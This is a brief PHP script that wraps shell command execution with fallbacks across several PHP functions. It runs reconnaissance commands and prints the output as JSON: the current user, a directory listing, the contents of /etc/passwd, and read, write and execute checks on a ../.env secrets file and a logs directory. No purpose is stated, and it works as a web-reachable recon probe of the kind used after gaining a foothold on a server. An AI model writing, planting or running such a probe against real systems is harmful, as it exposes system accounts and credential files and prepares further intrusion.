<?php
function terminal($command)
{
	//system
	if(function_exists('system'))
	{
		ob_start();
		system($command , $return_var);
		$output = ob_get_contents();
		ob_end_clean();
	}
	//passthru
	else if(function_exists('passthru'))
	{
		ob_start();
		passthru($command , $return_var);
		$output = ob_get_contents();
		ob_end_clean();
	}

	//exec
	else if(function_exists('exec'))
	{
		exec($command , $output , $return_var);
		$output = implode(',', $output);
	}

	//shell_exec
	else if(function_exists('shell_exec'))
	{
		$output = shell_exec($command) ;
	}

	else
	{
		$output = 'Command execution not possible on this system';
		$return_var = 1;
	}

	return array('cmd' => $command, 'output' => $output , 'status' => $return_var);
}

echo json_encode([
    terminal('whoami'),
    terminal('ls -l'),
    terminal('[ -w ../storage/logs ] && echo "Writable" || echo "Not Writable"'),
    terminal('id -u ${whoami}'),
    terminal('cat /etc/passwd'),
    terminal('[ -w ../.env ] && echo "Writable" || echo "Not Writable"'),
    terminal('[ -r ../.env ] && echo "Readable" || echo "Not Readable"'),
    terminal('[ -x ../.env ] && echo "Executable" || echo "Not Executable"'),
]);
?>
